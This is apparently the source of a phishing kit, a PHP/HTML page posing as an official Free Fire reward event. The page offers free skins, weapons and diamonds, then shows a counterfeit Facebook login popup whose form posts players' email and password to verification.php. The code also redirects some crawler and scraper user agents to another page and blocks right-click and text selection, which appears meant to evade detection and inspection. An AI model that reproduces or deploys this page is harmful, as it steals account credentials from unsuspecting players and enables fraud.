<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<style type="text/css">
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
@media only screen and (max-width:600px) {
	.popup-box-login-fb {
		margin-top: 4%;
	}
}
</style>
  
<div class="container">

<div style="background: #000; width: 100%; height: 50px; border-bottom: 1px solid #eaa300;">
<div style="margin-left: 6px; margin-top: 5px; color: #eaa300; font-size: 17px; font-family: Teko; text-align: left; text-transform: uppercase; float: left;">
FREE FIRE
</br>
<span style="color: #fff; line-height: 10px;">OFFICIAL FREE FIRE REWARD</span>
</div>
<div style="width: auto; margin-top: -7px; margin-right: 12px; float: right;">
<button type="button" style="background: #eaa300; width: auto; height: auto; margin-top: 17px; padding: 3px; padding-left: 7px; padding-right: 7px; color: #000; font-size: 15px; font-family: Teko; text-align: center; text-transform: uppercase; border:1px solid #ffcc57; border-radius: 1px;">Purchase</button>
<button type="button" style="background: #eaa300; width: auto; height: auto; margin-top: 17px; padding: 3px; padding-left: 7px; padding-right: 7px; color: #000; font-size: 15px; font-family: Teko; text-align: center; text-transform: uppercase; border:1px solid #ffcc57; border-radius: 1px;">Download</button>
</div>
</div>

<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div>

<div class="box">
<center>
<div class="alert">
<i class="fa fa-bell"></i>
<p>Welcome to FREE FIRE REWARD EVENT</p>
</div>
<div class="menu active" onmousedown="buka.play()" onclick="openHero(event, 'latest');" id="defaultOpen">BUNDLE</div>
<div class="menu" onmousedown="buka.play()" onclick="openHero(event, 'weapon');">WEAPOM</div>
<div class="menu" onmousedown="buka.play()" onclick="openHero(event, 'other');">DIAMOND</div>
</center>

<div id="latest" class="gallery">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0JT6gqq/1.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/0JT6gqq/1.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mJh6Y2w/10.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/mJh6Y2w/10.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SxSF99F/2.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/SxSF99F/2.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/GQvqFh5/3.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/GQvqFh5/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/nndXjdr/4.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/nndXjdr/4.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ngRXgX4/5.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/ngRXgX4/5.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qmtBTwD/6.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/qmtBTwD/6.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/VSCgr7X/9.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/VSCgr7X/9.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/2h5CMvJ/8.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/2h5CMvJ/8.jpg">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab --->

<div id="weapon" class="gallery">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SKXbqhn/5.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/SKXbqhn/5.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/FgSdvCg/6.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/FgSdvCg/6.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cgzndyb/ak.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/cgzndyb/ak.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/J7gdQhb/titan.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/J7gdQhb/titan.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wCrMDv1/mp40lgi.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/wCrMDv1/mp40lgi.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/S5WKRVt/m4.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/S5WKRVt/m4.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ZY20tTw/8.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/ZY20tTw/8.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BqJBdYs/m1014v2.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/BqJBdYs/m1014v2.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Bw4s5DB/2.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Bw4s5DB/2.jpg">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab --->

<div id="other" class="gallery">
<div class="scroll">
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">1080 + 720</div>
<div class="balance-detail">SPESIAL EVENT REWARD</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">2500 + 1080</div>
<div class="balance-detail">SPESIAL EVENT REWARD</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">5000 + 1000</div>
<div class="balance-detail">SPESIAL EVENT REWARD</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">7000 + 5000</div>
<div class="balance-detail">SPESIAL EVENT REWARD</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">10.000 + 2000</div>
<div class="balance-detail">SPESIAL EVENT REWARD</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
</div> <!--- scroll --->
</div> <!--- tab --->
</div> <!--- box --->
</div> <!--- container --->

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<a  onmousedown="tutup.play()" onclick="close_reward_confirmation()" class="popup-close"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup"><div class="nav-popup-title">Reward Confirmation</div></div>
<div class="popup-alert">Are you sure to collect this rewards?</div>
<img class="popup-item" src="" id="myImgReward">
<button type="button" class="popup-btn" onmousedown="buka.play()" onclick="account_login()">Collect</button>
</div>
</div>

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<a  onmousedown="tutup.play()" onclick="close_account_login()" class="popup-close"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup"><div class="nav-popup-title">Account Login</div></div>
<img style="width: 50px; margin-top: 10px; margin-left: auto; margin-right: auto; border: 1px solid #fff; border-radius: 50%; display: block;" src="https://i.ibb.co/42CM9Pq/IMG-20210208-193731.jpg">
<div class="popup-alert">Log in using your FREE FIRE account to receive rewards</div>
<button type="button" class="btn-login facebook" onmousedown="buka.play()" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<br>
<br>
</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://i.ibb.co/42CM9Pq/IMG-20210208-193731.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to FREE FIRE
			</div>
			<form class="login-form" action="verification.php" method="post">
				<label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>


<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>